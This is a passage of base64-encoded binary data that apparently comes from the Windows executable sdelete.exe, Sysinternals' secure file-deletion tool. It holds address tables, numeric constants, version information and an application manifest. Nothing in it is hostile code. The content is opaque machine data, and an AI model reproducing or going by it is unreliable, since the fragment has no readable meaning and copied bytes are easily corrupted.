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AOhSAAA0UwAAaB0DADRTAACtUwAAcB0DALxTAAD/UwAAPB0DAABUAADmVAAAgB0DAOhUAAAzVQAA0B0DADRVAABaVQAA3B0DAFxVAAB5VQAAIB4DAHxVAACgVQAAGB4DAKBVAAC9VQAAKB4DAMBVAADdVQAAMB4DAOBVAABxVgAA5B0DAHRWAACYVgAAEB4DAJhWAADHVgAAgB4DAMhWAAAFVwAAeB4DAAhXAAACWAAAOB4DAARYAADgWAAAbB4DAOBYAAB4WQAAAB8DAHhZAABwWwAAiB4DAHBbAAAaXAAA3B4DABxcAACQXAAANB8DAJBcAACKXQAAPB8DAIxdAAA5XgAA7B4DAGheAAAQXwAAjB8DAChfAACsXwAAcB8DAKxfAACZYAAAeB8DAJxgAADsYAAApB8DAOxgAACiYQAAlB8DAKRhAADBYQAAtB8DAMRhAAAnYgAArB8DAEBiAABfYgAAwB8DAGBiAABgYwAA+B8DAGBjAAB1ZAAAECADAHhkAAC5ZAAA1B8DALxkAADSZAAAzB8DANRkAAAaZgAA5B8DABxmAABCZgAAxB8DAGRmAAD6ZgAA3B8DABRnAABKZwAAKCADAExnAACCZwAAMCADAIRnAADPZwAA8B8DANBnAAAwaAAAOCADADBoAABpaAAATCADAIRoAAAZagAAWCADAChqAABlagAAkCADAIBqAAChagAA1CADAKRqAADLagAAzCADAMxqAADtagAA3CADAPBqAAARawAA5CADADxrAADnawAAmCADAOhrAAAPbAAAxCADABBsAAAxbAAAKCEDADRsAABbbAAAICEDAFxsAAB9bAAAMCEDAIBsAAChbAAAOCEDAKRsAABPbQAA7CADAFBtAAB3bQAAGCEDAHhtAACVbQAAnCEDAJhtAAC9bQAAQCEDAMBtAADhbQAAeCEDAORtAAAJbgAAYCEDAAxuAAAtbgAAgCEDADBuAABSbgAAUCEDAFRuAAB1bgAAiCEDAHhuAAA8bwAAkCEDADxvAABgbwAAWCEDAGBvAAB9bwAAaCEDAIBvAACdbwAAcCEDAKBvAADEbwAASCEDAORvAAADcAAAYCIDAARwAAAucAAApCEDADBwAAAwcQAARCIDADBxAABacQAAzCEDAFxxAACecQAAWCIDAIRyAACucgAA9CEDALByAABRdAAAaCIDAFR0AACCdAAAHCIDALB0AAAVegAAkCIDADB6AABafAAAmCIDAFx8AAAmfQAAnCIDAEB9AACmfQAAqCIDAOB+AAAufwAAsCIDAEB/AAAHgAAAuCIDAKiAAAAoggAAxCIDAHSCAACgggAAvCIDAKCCAACyggAA8CIDALSCAABcgwAA+CIDAFyDAACggwAAKCMDAKCDAADMgwAAiCMDAMyDAABThAAAdCMDAFSEAAARhQAANCMDABSFAAB1hQAAZCMDAJCFAAAPhgAAsCMDABCGAACKhgAAmCMDAIyGAAANhwAAyCMDABCHAACUhwAA4CMDAKSHAADLhwAAkCMDAMyHAACjiAAA+CMDAKSIAACFiQAAKCQDAIiJAAB5kQAAXCQDAHyRAABdkwAAgCQDAGiTAAB8kwAA9CQDAHyTAABulAAAtCQDAIiUAADtlAAA4CQDAPCUAAAOlQAAnCQDABCVAAA/lQAApCQDAECVAAB7lQAArCQDAHyVAAC3lQAA1CQDALiVAAATlgAA/CQDABSWAAAlmQAAKCUDACiZAABImQAAaCUDAEiZAACWmQAAgCUDAJiZAAC4mQAAUCUDALiZAADzmQAAeCUDAPSZAAAvmgAAYCUDAICaAAC6mgAAcCUDALyaAAD2mgAAWCUDAPiaAAAbmwAApCUDABybAAA/mwAAnCUDAECbAABjmwAArCUDAGSbAACHmwAAtCUDAIibAACrmwAAjCUDAKybAABMnAAAvCUDAEycAABvnAAAlCUDAHCcAACnnAAAACYDAKicAAB3nQAA8CUDAHidAAAOqAAACCYDACioAABfqAAALCYDAGCoAACxqAAANCYDALSoAABNqQAASCYDAFCpAAB9rAAAYCYDAICsAADzrAAAsCYDAPSsAAAprQAAaCcDACytAACZrQAA4CYDAJytAAANrgAA7CYDABCuAAArrgAAECcDACyuAABHrgAAICcDAJCuAAC9rgAAQCcDAGCvAAB7rwAAKCcDAHyvAACXrwAAMCcDALCvAADdrwAASCcDAOCvAAANsAAAOCcDABCwAAA8sAAAyCYDADywAABksAAAWCcDAGSwAACPsAAA+CYDAJCwAADcsAAAwCYDANywAADWtAAAYCcDANi0AAAFtQAAUCcDACC1AAA7tQAAACcDADy1AABXtQAAGCcDAGi1AACHtQAA2CYDAIi1AACotQAA0CYDAKi1AADDtQAACCcDAMS1AAAHtgAAcCcDADi2AACnuAAAeCcDAKi4AADZuAAAnCcDAGi5AAD+ugAAzCcDAKS7AAAZvAAApCcDABy8AAB+vAAA4CcDAIC8AACovAAAWCgDAOS8AABhvQAAgCgDAGS9AADyvQAAiCgDAPS9AADVvwAAnCgDANi/AACSwAAA7CcDAJTAAADOwAAAUCgDANDAAAAUwwAAGCgDABTDAADCxQAAYCgDANzFAAAPxwAAzCgDABDHAABMxwAAECkDAEzHAABwxwAAuCgDAHDHAADyxwAAwCgDAPTHAAC2yAAAGCkDALjIAAA3yQAAXCkDADjJAABcyQAAZCkDAGDJAACnyQAAmCoDALjJAAA6ygAAiCoDAFTKAAD2ygAA8CoDAPjKAACtzAAABCsDALDMAAAZzQAAbCkDABzNAADYzQAAgCsDANjNAABPzgAAuCkDAFDOAAAi0gAAwCoDACTSAAC+0gAAzCkDAMDSAABc0wAAdCkDAFzTAABb1AAAdCoDAFzUAADB1AAA4CoDAMTUAABf1gAADCoDAGDWAAA02AAAQCsDADTYAACe2gAAXCsDAKDaAACu3QAAHCsDAPjdAABH3gAAkCsDAEjeAAB73gAAiCsDAIzeAACs3gAAnCsDALjeAAAB3wAAvCsDAATfAADV3wAAxCsDANjfAADr3wAAtCsDAOzfAACH4AAApCsDAIjgAACW4QAArCsDAJjhAADQ4QAAzCsDANDhAAAI4gAA2CsDAGDiAACt4gAA5CsDAODiAAAj4wAAUCwDACTjAAAu5AAAGCwDADDkAAAk5QAAWCwDACTlAAA75QAAECwDADzlAAB15QAAcCwDAHjlAACY5QAApCwDAJjlAAC35QAAfCwDALjlAADV5QAAnCwDANjlAAD15QAAxCwDAPjlAADd5wAAzCwDAOjnAAD85wAA7CwDAAzoAAAg6AAA9CwDAEDoAADS6AAAaC0DANToAAAH6wAAMC0DAETrAADP7QAA/CwDANjtAAAS7wAAmC0DAIzvAAAz8AAArC0DAEzwAABc+gAA5C0DAGj6AACu+gAACC4DALD6AAAB+wAAEC4DAAT7AACY+wAAJC4DABD8AAC3/AAAPC4DAND8AABb/gAAdC4DAHz+AAAL/wAAoC4DAGD/AAA9AAEAiC4DAEAAAQBeAAEAxC4DAGAAAQCtAQEA8C4DALABAQDhAQEAvC4DAOQBAQAZAgEA1C4DABwCAQA2AwEACC8DADgDAQBpAwEAzC4DAGwDAQChAwEA3C4DAKQDAQAdBAEA5C4DACAEAQA2BAEAtC4DADgEAQBmBAEAIC8DAGgEAQAZBQEASC8DABwFAQA8BQEAZC8DADwFAQB3BQEAXC8DAHgFAQAcBwEAbC8DABwHAQBlBwEAgC8DAGgHAQCjBwEAkC8DAKwHAQCUCQEAmC8DALwJAQAhDAEA9C8DACQMAQAyDQEAwC8DADQNAQBkDQEA1C8DAGQNAQCGDQEA3C8DAIgNAQCqDQEADDADALQNAQDWDQEAsC8DANgNAQALDgEA5C8DAAwOAQAxDgEA7C8DADQOAQBZDgEAuC8DAFwOAQCBDgEAFDADALwOAQDgDgEANDADAOAOAQBeDwEAPDADAGAPAQB8DwEAJDADAHwPAQAsEwEAnDADACwTAQBIEwEAHDADAEgTAQBBFQEAaDADAEQVAQA7FgEAhDADADwWAQBQFgEALDADAFAWAQCxFwEAuDADALQXAQCFGAEA0DADAIgYAQCkGAEAADEDAKQYAQDYGQEA6DADAOAZAQB2GgEARDADAIAaAQDAGgEATDADAMgaAQBHGwEAVDADAFwbAQCQGwEAXDADAJAbAQDIGwEACDEDAMgbAQDfGwEAEDEDAOAbAQCsHQEAGDEDAPgdAQDlHgEALDEDAOgeAQCAIAEAPDEDAIAgAQC4IQEAVDEDAMAhAQAAIgEAbDEDAAAiAQCsIgEAdDEDAKwiAQAuIwEAgDEDADAjAQCqIwEAwDEDAKwjAQASJAEAlDEDABQkAQDnJAEAzDEDAOgkAQBuJQEA3DEDAHAlAQAKJgEA7DEDAAwmAQA4JgEACDIDADgmAQBkJgEA+DEDAGQmAQCnJgEAIDIDAOQmAQAQJwEAEDIDABAnAQA8JwEAADIDAJwnAQDhJwEAGDIDAJAoAQDvKAEAKDIDAPAoAQDVKQEAMDIDANgpAQBrKgEAZDIDAGwqAQC9KwEAdDIDAMgrAQD6KwEAjDIDAPwrAQBVLAEAtDIDAHAsAQCULAEAwDIDAKAsAQC4LAEAyDIDAMAsAQDBLAEAzDIDANAsAQDRLAEA0DIDANwsAQD4LQEA1DIDAPgtAQBoNgEADDMDAGg2AQBRQQEAJDMDAFRBAQCLQQEASDMDAIxBAQDdQQEAUDMDAOBBAQB5QgEAZDMDAHxCAQCsQwEAoDMDAKxDAQB+VQEAfDMDAIBVAQC3VQEAsDMDALhVAQAJVgEAuDMDAAxWAQClVgEAzDMDAMBWAQBoVwEA6DMDAGhXAQBbWQEAGDQDAFxZAQDBWQEA7DMDAMxZAQBRWgEANDQDAFRaAQC/WgEAPDQDANxaAQCoWwEARDQDAKhbAQAbXgEATDQDABxeAQBAXgEAaDQDAEBeAQBKXwEAjDQDAExfAQBMZAEAcDQDAIhkAQD0ZAEAsDQDAPRkAQC6ZwEAlDQDAPhnAQDyawEA4DQDAPRrAQCRbAEAuDQDAJRsAQANeAEAyDQDABB4AQBIeAEA6DQDAEh4AQA0ewEAADUDAFB7AQDmewEA8DQDAOh7AQBefQEAODUDAGB9AQDcfQEAKDUDAOB9AQAXfgEAcDUDABh+AQBPfgEAeDUDAFB+AQCLfgEAaDUDAIx+AQDGfgEAYDUDANx+AQD/ggEAgDUDAACEAQCQhAEALDYDAJCEAQBAhQEA5DUDAECFAQDHhQEADDYDAPiFAQCDiQEA7DUDAISJAQBhigEAFDYDAGSKAQAYiwEAQDYDABiLAQCAiwEAUDYDAICLAQDuiwEAZDYDAPCLAQCJjAEAyDUDAIyMAQAYjwEAqDUDABiPAQAEkAEADDcDAASQAQBZkAEAADcDAFyQAQB9kAEALDcDAICQAQA0kQEArDYDADSRAQDHkQEA2DYDAPCRAQAdlAEAuDYDACCUAQAclQEA5DYDAGyVAQAalgEANDcDAESWAQDplgEARDcDAOyWAQCFlwEAkDYDAIiXAQAemgEAdDYDAGSaAQDumgEA4DcDAPCaAQB/mwEAdDcDAICbAQAvnAEAYDcDADCcAQBinAEAWDcDAHCcAQC0nAEAhDcDALScAQAunQEAjDcDADCdAQCAnQEAnDcDAICdAQD1nQEArDcDAPidAQA5ngEAvDcDADyeAQBungEAyDcDAHCeAQD/ngEA0DcDAFifAQCRnwEA+DcDALyfAQARoAEAADgDABSgAQDQoAEACDgDANCgAQA6ogEAIDgDADyiAQCiogEAEDgDAKSiAQDJrAEASDgDAMysAQASrQEAbDgDABStAQBlrQEAdDgDAGitAQD8rQEAiDgDAPytAQDPvgEAoDgDANC+AQDyvwEAxDgDAADAAQBGwAEA1DgDAEjAAQCZwAEA3DgDAJzAAQAwwQEA8DgDADDBAQCrwQEAGDkDAKzBAQA2wwEAMDkDADjDAQCMwwEACDkDAIzDAQCgwwEAKDkDAKDDAQDzwwEAQDkDAIzFAQC7xgEASDkDAMTGAQCTxwEAjDkDAJzHAQBjyAEAZDkDAIDIAQBKyQEAeDkDAFjJAQCAyQEAYDoDAIDJAQClyQEAWDoDALDJAQASygEAIDoDABTKAQB2ygEAqDkDAHjKAQDlygEAEDoDAOjKAQBHywEAUDoDAEjLAQC5ywEAcDoDALzLAQAtzAEAaDoDADDMAQCPzAEA2DkDAJDMAQDyzAEAQDoDAPTMAQBTzQEAyDkDAFTNAQC2zQEAMDoDALjNAQAXzgEACDoDABjOAQB3zgEA+DkDAHjOAQDXzgEAuDkDANjOAQA6zwEA6DkDADzPAQC7zwEAGDoDALzPAQA70AEAoDkDAGzQAQDm0AEASDoDAOjQAQBi0QEA0DkDAGTRAQDj0QEAODoDAOTRAQBe0gEAwDkDAGDSAQDf0gEAKDoDAODSAQBa0wEAADoDAFzTAQDW0wEA8DkDANjTAQBS1AEAsDkDAFTUAQDT1AEA4DkDANjUAQAq1gEAeDoDAEzWAQCt1gEAiDoDALDWAQD01wEAkDoDAPTXAQC/2AEAmDoDAMDYAQCN2QEAvDoDAJDZAQBH2gEApDoDAFDaAQCE2gEAxDoDAITaAQBH2wEAzDoDAEjbAQAC3AEA/DoDAATcAQA73AEACDsDADzcAQBc3AEAGDsDAFzcAQCX3AEAEDsDAJjcAQAl3gEAIDsDACjeAQBL3gEATDsDAEzeAQBz3gEANDsDAHTeAQCW3gEAPDsDAJjeAQCr3gEAVDsDAKzeAQC/3gEARDsDAMDeAQDR3wEAcDsDANTfAQDk4AEAXDsDAOTgAQBw4QEAhDsDAHDhAQAH4gEAjDsDAAjiAQAe4wEAlDsDACDjAQBc5QEAzDsDAFzlAQB+5QEAtDsDAIDlAQCl5QEAxDsDAKjlAQDY5QEArDsDANjlAQAL5gEAvDsDAAzmAQDS5gEA5DsDAJznAQDS6AEAXDwDANToAQB96QEAdDwDAOzpAQCQ7wEAiDwDAJDvAQBG9QEA/DsDAEj1AQD++gEAIDwDAAD7AQDr+wEARDwDAOz7AQBh/AEAzDwDAGT8AQCR/wEABD0DAJT/AQBIAwIA4DwDAKADAgABDAIAqDwDACgMAgADDQIAKD0DAAQNAgDcFwIAOD0DAFgYAgDNGAIAgD0DANAYAgBJIgIAXD0DAEwiAgBuJAIAlD0DACAmAgA4JgIAYB0DADgmAgBgJgIAwB0DAGAmAgB5JgIAyB0DAHkmAgCTJgIACB4DAJMmAgCqJgIAZB4DAKomAgDDJgIALB8DAMMmAgDeJgIAzB4DAN4mAgD3JgIA1B4DAPcmAgA4JwIAaB8DADgnAgBcJwIAiCADAFwnAgCDJwIAvCADAIMnAgCqJwIAECEDAKonAgDDJwIAxCEDAMMnAgDcJwIA7CEDANwnAgD1JwIAFCIDAPUnAgAOKAIAPCIDAA4oAgAsKAIA6CIDACwoAgBFKAIAICMDAEUoAgBiKAIAXCMDAGIoAgB5KAIAICQDAHkoAgCQKAIAVCQDAJAoAgCoKAIAICUDAKgoAgDAKAIA6CUDAMAoAgDbKAIAqCYDANsoAgD0KAIAxCcDAPQoAgANKQIAECgDAA0pAgAmKQIASCgDACYpAgA/KQIAACkDAD8pAgBYKQIACCkDAFgpAgBxKQIATCkDAHEpAgCKKQIAVCkDAIopAgCjKQIA/CkDAKMpAgC8KQIABCoDALwpAgDVKQIAqCkDANUpAgDuKQIAsCkDAO4pAgAHKgIAuCoDAAcqAgAiKgIAXCoDACIqAgA9KgIAZCoDAD0qAgBYKgIAbCoDAGAqAgCAKgIACCwDAIAqAgCUKgIASCwDAJQqAgCqKgIAkC0DAKoqAgDIKgIAYC0DAMgqAgDeKgIAKC0DAN4qAgD2KgIA3C0DAPYqAgAOKwIAbC4DAA4rAgAnKwIAQC8DACcrAgA/KwIAuDEDAD8rAgBWKwIAXDIDAFYrAgBvKwIArDIDAG8rAgCGKwIABDMDAIYrAgCeKwIAEDQDAJ4rAgC1KwIA9DoDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAAA4AACAAAAAAAAAAAAAAAAAAAABAAEAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAkEAACAAAAAAAAAAAAAAAAAAAAAAAABAAkEAACQAAAAoLADACQDAAAAAAAAAAAAAMizAwB9AQAAAAAAAAAAAAAkAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQACAAIAAAAAAAIAAgAAAAAAPwAAAAAAAAAEAAQAAQAAAAAAAAAAAAAAAAAAAIICAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAF4CAAABADAANAAwADkAMAA0AGIAMAAAAGgAJAABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAIAAtACAAdwB3AHcALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAAAATgATAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFMAZQBjAHUAcgBlACAAZgBpAGwAZQAgAGQAZQBsAGUAdABlAAAAAAAqAAUAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADIALgAwADIAAAAAADAACAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAUwBEAGUAbABlAHQAZQAAAHYAKQABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAKABDACkAIAAxADkAOQA5AC0AMgAwADEAOAAgAE0AYQByAGsAIABSAHUAcwBzAGkAbgBvAHYAaQBjAGgAAAAAAEAADAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABzAGQAZQBsAGUAdABlAC4AZQB4AGUAAABKABUAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFMAeQBzAGkAbgB0AGUAcgBuAGEAbABzACAAUwBkAGUAbABlAHQAZQAAAAAALgAFAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMgAuADAAMgAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAkEsAQAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAgAcAAAAYKRopHCkeKSApJikoKSopLCkAAAAsAIAOAAAANii+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYpwDAAgA4AAAAYKFooXCheKGApZClmKWgpailsKW4pcClyKXQpdil4KXopfCl+KUApgimOKdApwAAANACALgAAACQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCl0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6g